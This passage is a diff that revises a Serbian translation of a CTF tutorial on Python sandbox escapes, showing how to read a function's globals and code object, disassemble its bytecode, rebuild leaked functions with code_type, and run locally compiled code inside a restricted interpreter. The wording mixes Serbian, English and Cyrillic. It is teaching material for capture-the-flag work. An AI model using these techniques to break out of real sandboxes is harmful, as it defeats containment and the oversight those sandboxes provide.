+U nekim CTF-ovima može vam biti dato ime **custom function where the flag** i morate pogledati **internals** te **function** da biste ga izvukli.
 
-Ovo je funkcija koju treba pregledati:
+Ovo je funkcija koju treba ispitati:
 ```python
 def get_flag(some_input):
 var1=1
@@ -807,7 +809,7 @@ dir(get_flag) #Get info tof the function
 ```
 #### globals
 
-`__globals__` and `func_globals` (isto) dohvataju globalno okruženje. U primeru možete videti neke importovane module, neke globalne promenljive i njihov sadržaj:
+`__globals__` and `func_globals` (Same) dohvataju globalno okruženje. U primeru možete videti nekoliko importovanih modula, neke globalne promenljive i njihov sadržaj:
 ```python
 get_flag.func_globals
 get_flag.__globals__
@@ -820,7 +822,7 @@ CustomClassObject.__class__.__init__.__globals__
 
 ### **Pristup kodu funkcije**
 
-**`__code__`** and `func_code`: Možete **pristupiti** ovom **atributu** funkcije da biste **dobili code object** funkcije.
+**`__code__`** i `func_code`: Možete **pristupiti** ovom **atributu** funkcije da **dobijete code object** funkcije.
 ```python
 # In our current example
 get_flag.__code__
@@ -880,7 +882,7 @@ get_flag.__code__.co_freevars
 get_flag.__code__.co_code
 'd\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x00|\x00\x00|\x02\x00k\x02\x00r(\x00d\x05\x00Sd\x06\x00Sd\x00\x00S'
 ```
-### **Disasemblovanje funkcije**
+### **Disassembly funkcije**
 ```python
 import dis
 dis.dis(get_flag)
@@ -908,7 +910,7 @@ dis.dis(get_flag)
 44 LOAD_CONST               0 (None)
 47 RETURN_VALUE
 ```
-Obratite pažnju da **ako ne možete да importujete `dis` у python sandbox** можете да добијете **bytecode** функције (`get_flag.func_code.co_code`) и **disassemble** га локално. Нећете видети садржај променљивих које се учитавају (`LOAD_CONST`), али их можете насетити из (`get_flag.func_code.co_consts`) зато што `LOAD_CONST` такође показује offset променљиве која се учитава.
+Obratite pažnju da **if you cannot import `dis` in the python sandbox** možete dobiti **bytecode** funkcije (`get_flag.func_code.co_code`) i **disassemble** ga lokalno. Nećete videti sadržaj varijabli koje se učitavaju (`LOAD_CONST`), ali ih možete naslutiti iz (`get_flag.func_code.co_consts`) jer `LOAD_CONST` takođe pokazuje offset varijable koja se učitava.
 ```python
 dis.dis('d\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x00|\x00\x00|\x02\x00k\x02\x00r(\x00d\x05\x00Sd\x06\x00Sd\x00\x00S')
 0 LOAD_CONST          1 (1)
@@ -932,8 +934,8 @@ dis.dis('d\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x0
 ```
 ## Kompajliranje Pythona
 
-Sada zamislimo da na neki način možete **dump the information about a function that you cannot execute**, ali morate da je **izvršite**.\
-Kao u sledećem primeru, možete **access the code object** te funkcije, ali samo čitajući disassemble ne znate kako da izračunate flag (_zamislite složeniju `calc_flag` funkciju_)
+Sada, zamislimo da na neki način možete **dump informacije o funkciji koju ne možete izvršiti**, ali morate tu funkciju **izvršiti**.\
+Kao u sledećem primeru, možete **pristupiti code object** te funkcije, ali samo čitajući disassemble ne znate kako da izračunate flag (_zamislite složeniju `calc_flag` funkciju_)
 ```python
 def get_flag(some_input):
 var1=1
@@ -948,7 +950,7 @@ return "Nope"
 ```
 ### Kreiranje code object
 
-Prvo, moramo znati **kako kreirati i izvršiti code object** da bismo mogli napraviti jedan koji će izvršiti našu function leaked:
+Prvo, moramo znati **kako kreirati i izvršiti code object** da bismo mogli da napravimo jedan i izvršimo našu funkciju leaked:
 ```python
 code_type = type((lambda: None).__code__)
 # Check the following hint if you get an error in calling this
@@ -968,7 +970,7 @@ mydict['__builtins__'] = __builtins__
 function_type(code_obj, mydict, None, None, None)("secretcode")
 ```
 > [!TIP]
-> U zavisnosti od verzije python-a, **parametri** `code_type` mogu imati **drugačiji redosled**. Najbolji način da saznate redosled parametara u verziji python-a koju pokrećete je da pokrenete:
+> U zavisnosti od python verzije, **parametri** `code_type` mogu imati **drugačiji redosled**. Najbolji način da saznate redosled parametara u python verziji koju koristite je da pokrenete:
 >
 > ```
 > import types
@@ -976,10 +978,10 @@ function_type(code_obj, mydict, None, None, None)("secretcode")
 > 'code(argcount, posonlyargcount, kwonlyargcount, nlocals, stacksize,\n      flags, codestring, constants, names, varnames, filename, name,\n      firstlineno, lnotab[, freevars[, cellvars]])\n\nCreate a code object.  Not for the faint of heart.'
 > ```
 
-### Rekreiranje leaked funkcije
+### Rekreiranje leaked function
 
 > [!WARNING]
-> U sledećem primeru preuzećemo sve podatke potrebne za rekreiranje funkcije direktno iz code objekta funkcije. U **pravom primeru**, sve **vrednosti** potrebne za izvršavanje funkcije **`code_type`** su ono što **you will need to leak**.
+> U sledećem primeru ćemo uzeti sve podatke potrebne da rekreiramo function direktno iz function code object-a. U **pravom primeru**, sve **vrednosti** za izvršenje funkcije **`code_type`** su ono što ćete morati leak.
 ```python
 fc = get_flag.__code__
 # In a real situation the values like fc.co_argcount are the ones you need to leak
@@ -990,12 +992,12 @@ mydict['__builtins__'] = __builtins__
 function_type(code_obj, mydict, None, None, None)("secretcode")
 #ThisIsTheFlag
 ```
-### Zaobilaženje odbrane
+### Zaobilaženje zaštita
 
-U prethodnim primerima na početku ovog posta možete videti **kako izvršiti bilo koji python kod koristeći funkciju `compile`**. Ovo je interesantno jer možete **izvršiti cele skripte** sa petljama i svime u **one liner** (i isto bismo mogli uraditi koristeći **`exec`**).\
-U svakom slučaju, ponekad može biti korisno da **kreirate** **compiled object** na lokalnoj mašini i izvršite ga na **CTF machine** (na primer zato što nemamo funkciju `compiled` u CTF-u).
+U prethodnim primerima na početku ovog posta, možete videti **kako izvršiti bilo koji python kod koristeći funkciju `compile`**. Ovo je zanimljivo zato što možete **izvršiti čitave skripte** sa petljama i svim ostalim u **jednoj liniji** (i isto bismo mogli uraditi koristeći **`exec`**).\\
+U svakom slučaju, ponekad može biti korisno **kreirati** **kompajlirani objekat** na lokalnoj mašini i izvršiti ga u **CTF machine** (na primer zato što u CTF-u nemamo funkciju `compiled`).
 
-Na primer, hajde da ručno kompajliramo i izvršimo funkciju koja čita _./poc.py_:
+Na primer, kompajlirajmo i ručno izvršimo funkciju koja učitava _./poc.py_:
 ```python
 #Locally
 def read():
@@ -1022,7 +1024,7 @@ mydict['__builtins__'] = __builtins__
 codeobj = code_type(0, 0, 3, 64, bytecode, consts, names, (), 'noname', '<module>', 1, '', (), ())
 function_type(codeobj, mydict, None, None, None)()
 ```
-Ako ne možete da pristupite `eval` ili `exec`, možete napraviti **pravu funkciju**, ali direktno pozivanje obično neće uspeti sa: _constructor not accessible in restricted mode_. Zato vam treba **funkcija koja nije u ograničenom okruženju da pozove ovu funkciju.**
+Ako ne možete da pristupite `eval` ili `exec`, možete napraviti **pravu funkciju**, ali njeno direktno pozivanje obično neće uspeti sa: _constructor not accessible in restricted mode_. Dakle, potrebna vam je **funkcija van ograničenog okruženja koja će pozvati ovu funkciju.**
 ```python
 #Compile a regular print
 ftype = type(lambda: None)
@@ -1030,9 +1032,9 @@ ctype = type((lambda: None).func_code)
 f = ftype(ctype(1, 1, 1, 67, '|\x00\x00GHd\x00\x00S', (None,), (), ('s',), 'stdin', 'f', 1, ''), {})
 f(42)
 ```
-## Dekompajliranje kompajliranog Python koda
+## Decompiling Compiled Python
 
-Korišćenjem alata kao što je [**https://www.decompiler.com/**](https://www.decompiler.com) moguće je **dekompajlirati** dati kompajlirani Python kod.
+Korišćenjem alata poput [**https://www.decompiler.com/**](https://www.decompiler.com) moguće je **decompile** dati kompajlirani Python kod.
 
 **Pogledajte ovaj tutorijal**:
 
@@ -1041,11 +1043,11 @@ Korišćenjem alata kao što je [**https://www.decompiler.com/**](https://www.de
 ../../basic-forensic-methodology/specific-software-file-type-tricks/.pyc.md
 {{#endref}}
 
-## Ostalo (Python)
+## Ostalo za Python
 
 ### Assert
 
-Python pokrenut sa optimizacijama pomoću parametra `-O` će ukloniti assert izjave i bilo koji kod koji je uslovljen vrednošću **debug**.\
+Python koji se izvršava sa optimizacijama uz parametar `-O` ukloniće asset statements i sav kod koji je uslovljen vrednošću **debug**.\
 Zbog toga, provere poput
 ```python
 def check_permission(super_user):
@@ -1057,7 +1059,7 @@ print(f"\nNot a Super User!!!\n")
 ```
 biće zaobiđeno
 
-## Reference
+## Izvori
 
 - [https://lbarman.ch/blog/pyjail/](https://lbarman.ch/blog/pyjail/)
 - [https://ctf-wiki.github.io/ctf-wiki/pwn/linux/sandbox/python-sandbox-escape/](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/sandbox/python-sandbox-escape/)
